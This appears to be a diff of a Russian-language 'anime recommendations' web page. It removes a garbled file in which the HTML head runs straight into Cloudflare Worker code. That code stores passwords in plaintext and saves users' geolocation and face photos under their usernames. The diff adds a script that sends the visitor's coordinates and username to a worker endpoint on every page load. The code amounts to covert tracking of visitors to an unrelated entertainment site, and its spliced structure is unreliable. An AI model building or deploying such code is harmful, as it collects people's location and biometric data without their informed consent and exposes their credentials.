@@ -1,55 +1,23 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Аниме Рекомендации</title>
-    <style>
-        body {
-export default {
-    async fetch(request, env) {
-        const url = new URL(request.url);
+<script>
+    function sendGeolocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async function(position) {
+                let username = localStorage.getItem('currentUser');
+                if (!username) return;
 
-        if (request.method === "POST") {
-            const data = await request.json();
-            if (url.pathname === "/register") {
-                const key = `user:${data.username}`;
-                let existingUser = await env.USERS_KV.get(key);
-
-                if (existingUser) {
-                    return new Response("Имя пользователя уже занято!", { status: 400 });
-                }
-
-                await env.USERS_KV.put(key, JSON.stringify({ password: data.password }));
-                return new Response("Регистрация успешна!", { status: 200 });
-
-            } else if (url.pathname === "/login") {
-                const key = `user:${data.username}`;
-                let userData = await env.USERS_KV.get(key);
-
-                if (userData) {
-                    let user = JSON.parse(userData);
-                    if (user.password === data.password) {
-                        return new Response("Успешный вход!", { status: 200 });
-                    }
-                }
-                return new Response("Неверный логин или пароль!", { status: 403 });
-
-            } else if (url.pathname === "/save-location") {
-                const key = `geo:${data.username}`;
-                await env.GEOLOCATION_KV.put(key, JSON.stringify({ lat: data.lat, lon: data.lon }));
-                return new Response("Геолокация сохранена!", { status: 200 });
-
-            } else if (url.pathname === "/save-photo") {
-                const key = `face:${data.username}`;
-                await env.FACE_KV.put(key, data.photo);
-                return new Response("Фото сохранено!", { status: 200 });
-            }
+                await fetch('https://your-cloudflare-worker-url/save-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username,
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    })
+                });
+            });
         }
-
-        return new Response("Not Found", { status: 404 });
     }
-};
+
+    window.onload = sendGeolocation;
 </script>
-</body>
-</html>
+
